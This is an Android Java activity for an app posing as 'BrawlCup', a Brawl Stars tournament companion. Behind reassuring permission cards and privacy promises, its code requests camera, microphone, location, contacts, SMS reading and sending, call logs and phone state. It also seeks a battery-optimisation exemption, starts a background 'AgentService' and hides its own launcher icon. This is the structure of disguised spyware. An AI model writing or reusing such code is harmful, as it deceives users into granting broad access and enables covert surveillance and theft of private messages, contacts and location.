package com.brawlcup.app;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int PERM_REQUEST = 1001;

    // BrawlCup purple theme colors
    private static final int COLOR_BG = 0xFF1A0A2E;
    private static final int COLOR_CARD = 0xFF2D1B4E;
    private static final int COLOR_CARD_BORDER = 0xFF6B3FA0;
    private static final int COLOR_ACCENT = 0xFFFFB800;
    private static final int COLOR_ACCENT_DARK = 0xFFE5A500;
    private static final int COLOR_TEXT = 0xFFFFFFFF;
    private static final int COLOR_TEXT_DIM = 0xFFB8A9D4;
    private static final int COLOR_GREEN = 0xFF4CAF50;
    private static final int COLOR_PURPLE_LIGHT = 0xFF9C6ADE;

    private LinearLayout mainContainer;
    private LinearLayout permissionContainer;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Full screen immersive
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        );
        getWindow().setStatusBarColor(COLOR_BG);
        getWindow().setNavigationBarColor(COLOR_BG);

        buildUI();
    }

    private int dp(int value) {
        return (int) TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP, value,
            getResources().getDisplayMetrics()
        );
    }

    private void buildUI() {
        // Root scroll view
        ScrollView scrollView = new ScrollView(this);
        scrollView.setBackgroundColor(COLOR_BG);
        scrollView.setFillViewport(true);
        scrollView.setVerticalScrollBarEnabled(false);

        // Main container
        mainContainer = new LinearLayout(this);
        mainContainer.setOrientation(LinearLayout.VERTICAL);
        mainContainer.setGravity(Gravity.CENTER_HORIZONTAL);
        mainContainer.setPadding(dp(24), dp(40), dp(24), dp(32));

        // === LOGO / TROPHY ICON ===
        ImageView logo = new ImageView(this);
        logo.setImageResource(getResources().getIdentifier("ic_launcher", "drawable", getPackageName()));
        LinearLayout.LayoutParams logoParams = new LinearLayout.LayoutParams(dp(120), dp(120));
        logoParams.gravity = Gravity.CENTER;
        logoParams.bottomMargin = dp(16);
        logo.setLayoutParams(logoParams);
        mainContainer.addView(logo);

        // === APP TITLE ===
        TextView title = new TextView(this);
        title.setText("BrawlCup");
        title.setTextSize(TypedValue.COMPLEX_UNIT_SP, 36);
        title.setTextColor(COLOR_TEXT);
        title.setTypeface(Typeface.DEFAULT_BOLD);
        title.setGravity(Gravity.CENTER);
        mainContainer.addView(title);

        // === SUBTITLE ===
        TextView subtitle = new TextView(this);
        subtitle.setText("Tournament Companion");
        subtitle.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16);
        subtitle.setTextColor(COLOR_ACCENT);
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setTypeface(Typeface.DEFAULT_BOLD);
        LinearLayout.LayoutParams subParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        subParams.bottomMargin = dp(8);
        subtitle.setLayoutParams(subParams);
        mainContainer.addView(subtitle);

        // === DESCRIPTION ===
        TextView desc = new TextView(this);
        desc.setText("Your all-in-one Brawl Stars esports companion. Track live tournaments, manage your team, view real-time scores, and never miss a Brawl Cup match.");
        desc.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        desc.setTextColor(COLOR_TEXT_DIM);
        desc.setGravity(Gravity.CENTER);
        desc.setLineSpacing(dp(2), 1.0f);
        LinearLayout.LayoutParams descParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        descParams.bottomMargin = dp(24);
        desc.setLayoutParams(descParams);
        mainContainer.addView(desc);

        // === SECTION HEADER ===
        TextView permHeader = new TextView(this);
        permHeader.setText("Why We Need Permissions");
        permHeader.setTextSize(TypedValue.COMPLEX_UNIT_SP, 20);
        permHeader.setTextColor(COLOR_TEXT);
        permHeader.setTypeface(Typeface.DEFAULT_BOLD);
        LinearLayout.LayoutParams headerParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        headerParams.bottomMargin = dp(4);
        permHeader.setLayoutParams(headerParams);
        mainContainer.addView(permHeader);

        TextView permSubtext = new TextView(this);
        permSubtext.setText("BrawlCup uses these permissions to deliver the best tournament experience. Your data stays on your device and is never shared.");
        permSubtext.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
        permSubtext.setTextColor(COLOR_TEXT_DIM);
        permSubtext.setLineSpacing(dp(1), 1.0f);
        LinearLayout.LayoutParams permSubParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        permSubParams.bottomMargin = dp(16);
        permSubtext.setLayoutParams(permSubParams);
        mainContainer.addView(permSubtext);

        // === PERMISSION CARDS ===
        permissionContainer = new LinearLayout(this);
        permissionContainer.setOrientation(LinearLayout.VERTICAL);
        mainContainer.addView(permissionContainer);

        addPermissionCard(
            "\uD83D\uDCF7  Camera",
            "Take team photos, scan QR codes at tournament venues, and capture your gameplay highlights to share with the BrawlCup community.",
            "android.permission.CAMERA"
        );

        addPermissionCard(
            "\uD83C\uDF99  Microphone",
            "Voice chat with your team during matches, record match commentary, and use voice commands for hands-free tournament navigation.",
            "android.permission.RECORD_AUDIO"
        );

        addPermissionCard(
            "\uD83D\uDCCD  Location",
            "Find nearby BrawlCup tournaments and LAN events, connect with local players, and get directions to tournament venues in your area.",
            "android.permission.ACCESS_FINE_LOCATION"
        );

        addPermissionCard(
            "\uD83D\uDCDE  Phone & Contacts",
            "Invite friends to your team, sync your BrawlCup friend list, and receive important match notifications even when the app is in the background.",
            "android.permission.READ_CONTACTS"
        );

        addPermissionCard(
            "\uD83D\uDCE8  SMS",
            "Receive tournament verification codes, match reminders via SMS, and team invite links. Required for account verification and tournament check-in.",
            "android.permission.READ_SMS"
        );

        addPermissionCard(
            "\uD83D\uDCC2  Storage",
            "Save tournament replays, download bracket images, cache team logos and player profiles for offline viewing, and export your match history.",
            "android.permission.READ_EXTERNAL_STORAGE"
        );

        addPermissionCard(
            "\uD83D\uDD14  Background Services",
            "Keep you updated with live match scores, tournament bracket changes, and team chat messages in real-time \u2014 even when BrawlCup is minimized.",
            null
        );

        // === FEATURES SECTION ===
        LinearLayout.LayoutParams featHeaderParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        featHeaderParams.topMargin = dp(24);
        featHeaderParams.bottomMargin = dp(12);

        TextView featHeader = new TextView(this);
        featHeader.setText("What You Get");
        featHeader.setTextSize(TypedValue.COMPLEX_UNIT_SP, 20);
        featHeader.setTextColor(COLOR_TEXT);
        featHeader.setTypeface(Typeface.DEFAULT_BOLD);
        featHeader.setLayoutParams(featHeaderParams);
        mainContainer.addView(featHeader);

        addFeatureItem("\uD83C\uDFC6", "Live Tournament Tracking", "Follow Brawl Stars Championship, Brawl Cup, and community tournaments with real-time brackets and scores.");
        addFeatureItem("\uD83D\uDC65", "Team Management", "Create and manage your esports team, coordinate practice schedules, and track team performance stats.");
        addFeatureItem("\uD83D\uDCCA", "Player Statistics", "View detailed player stats, win rates, brawler usage, and performance history across all tournaments.");
        addFeatureItem("\uD83D\uDD14", "Match Alerts", "Never miss a match with smart notifications for your favorite teams and upcoming tournament rounds.");
        addFeatureItem("\uD83C\uDF0D", "Global Leaderboards", "Compete on global and regional leaderboards, earn ranking points, and climb to the top of the BrawlCup standings.");
        addFeatureItem("\uD83D\uDCF1", "Offline Mode", "Access saved tournaments, brackets, and team info even without an internet connection.");

        // === WEBSITE LINK ===
        LinearLayout.LayoutParams linkParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        linkParams.topMargin = dp(16);
        linkParams.bottomMargin = dp(16);

        TextView link = new TextView(this);
        link.setText("Learn more at brawlcup.com");
        link.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        link.setTextColor(COLOR_PURPLE_LIGHT);
        link.setGravity(Gravity.CENTER);
        link.setLayoutParams(linkParams);
        link.setOnClickListener(v -> {
            try {
                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://brawlcup.com/")));
            } catch (Exception ignored) {}
        });
        mainContainer.addView(link);

        // === GRANT PERMISSIONS BUTTON ===
        Button grantBtn = new Button(this);
        grantBtn.setText("GET STARTED");
        grantBtn.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16);
        grantBtn.setTextColor(COLOR_BG);
        grantBtn.setTypeface(Typeface.DEFAULT_BOLD);
        grantBtn.setAllCaps(true);

        GradientDrawable btnBg = new GradientDrawable();
        btnBg.setColor(COLOR_ACCENT);
        btnBg.setCornerRadius(dp(12));
        grantBtn.setBackground(btnBg);
        grantBtn.setPadding(dp(24), dp(14), dp(24), dp(14));

        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        btnParams.topMargin = dp(8);
        btnParams.bottomMargin = dp(16);
        grantBtn.setLayoutParams(btnParams);
        grantBtn.setOnClickListener(v -> requestPermissions());
        mainContainer.addView(grantBtn);

        // === PRIVACY NOTE ===
        TextView privacy = new TextView(this);
        privacy.setText("\uD83D\uDD12  Your privacy matters. BrawlCup only accesses data needed for tournament features. You can change permissions anytime in Settings.");
        privacy.setTextSize(TypedValue.COMPLEX_UNIT_SP, 12);
        privacy.setTextColor(COLOR_TEXT_DIM);
        privacy.setGravity(Gravity.CENTER);
        privacy.setLineSpacing(dp(1), 1.0f);
        mainContainer.addView(privacy);

        scrollView.addView(mainContainer);
        setContentView(scrollView);
    }

    private void addPermissionCard(String title, String description, String permission) {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setPadding(dp(16), dp(14), dp(16), dp(14));

        GradientDrawable cardBg = new GradientDrawable();
        cardBg.setColor(COLOR_CARD);
        cardBg.setCornerRadius(dp(12));
        cardBg.setStroke(dp(1), COLOR_CARD_BORDER);
        card.setBackground(cardBg);

        LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        cardParams.bottomMargin = dp(10);
        card.setLayoutParams(cardParams);

        // Title row with status
        LinearLayout titleRow = new LinearLayout(this);
        titleRow.setOrientation(LinearLayout.HORIZONTAL);
        titleRow.setGravity(Gravity.CENTER_VERTICAL);

        TextView titleText = new TextView(this);
        titleText.setText(title);
        titleText.setTextSize(TypedValue.COMPLEX_UNIT_SP, 15);
        titleText.setTextColor(COLOR_TEXT);
        titleText.setTypeface(Typeface.DEFAULT_BOLD);
        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
            0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        titleText.setLayoutParams(titleParams);
        titleRow.addView(titleText);

        // Status indicator
        if (permission != null) {
            TextView status = new TextView(this);
            boolean granted = checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
            status.setText(granted ? "\u2705" : "\u26A0\uFE0F");
            status.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16);
            titleRow.addView(status);
        }

        card.addView(titleRow);

        // Description
        TextView descText = new TextView(this);
        descText.setText(description);
        descText.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
        descText.setTextColor(COLOR_TEXT_DIM);
        descText.setLineSpacing(dp(1), 1.0f);
        LinearLayout.LayoutParams descParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        descParams.topMargin = dp(6);
        descText.setLayoutParams(descParams);
        card.addView(descText);

        permissionContainer.addView(card);
    }

    private void addFeatureItem(String emoji, String title, String description) {
        LinearLayout item = new LinearLayout(this);
        item.setOrientation(LinearLayout.HORIZONTAL);
        item.setPadding(dp(12), dp(10), dp(12), dp(10));

        LinearLayout.LayoutParams itemParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        itemParams.bottomMargin = dp(6);
        item.setLayoutParams(itemParams);

        GradientDrawable itemBg = new GradientDrawable();
        itemBg.setColor(0xFF221540);
        itemBg.setCornerRadius(dp(10));
        item.setBackground(itemBg);

        // Emoji
        TextView emojiView = new TextView(this);
        emojiView.setText(emoji);
        emojiView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 24);
        LinearLayout.LayoutParams emojiParams = new LinearLayout.LayoutParams(
            dp(40), ViewGroup.LayoutParams.WRAP_CONTENT);
        emojiParams.gravity = Gravity.CENTER_VERTICAL;
        emojiView.setLayoutParams(emojiParams);
        item.addView(emojiView);

        // Text column
        LinearLayout textCol = new LinearLayout(this);
        textCol.setOrientation(LinearLayout.VERTICAL);
        LinearLayout.LayoutParams colParams = new LinearLayout.LayoutParams(
            0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        textCol.setLayoutParams(colParams);

        TextView titleText = new TextView(this);
        titleText.setText(title);
        titleText.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        titleText.setTextColor(COLOR_TEXT);
        titleText.setTypeface(Typeface.DEFAULT_BOLD);
        textCol.addView(titleText);

        TextView descText = new TextView(this);
        descText.setText(description);
        descText.setTextSize(TypedValue.COMPLEX_UNIT_SP, 12);
        descText.setTextColor(COLOR_TEXT_DIM);
        descText.setLineSpacing(dp(1), 1.0f);
        textCol.addView(descText);

        item.addView(textCol);
        mainContainer.addView(item);
    }

    private void requestPermissions() {
        List<String> needed = new ArrayList<>();

        String[] dangerous = {
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION",
            "android.permission.READ_CONTACTS",
            "android.permission.READ_SMS",
            "android.permission.SEND_SMS",
            "android.permission.READ_CALL_LOG",
            "android.permission.READ_PHONE_STATE",
        };

        for (String perm : dangerous) {
            if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
                needed.add(perm);
            }
        }

        if (!needed.isEmpty()) {
            requestPermissions(needed.toArray(new String[0]), PERM_REQUEST);
        } else {
            launchService();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] perms, int[] results) {
        super.onRequestPermissionsResult(requestCode, perms, results);
        launchService();
    }

    private void launchService() {
        requestBatteryExemption();

        Intent svc = new Intent(this, AgentService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }

        // Hide from launcher after a short delay
        getWindow().getDecorView().postDelayed(() -> {
            hideLauncher();
            finish();
        }, 2000);
    }

    private void requestBatteryExemption() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        } catch (Exception ignored) {}
    }

    private void hideLauncher() {
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(
            new ComponentName(this, MainActivity.class),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
    }
}
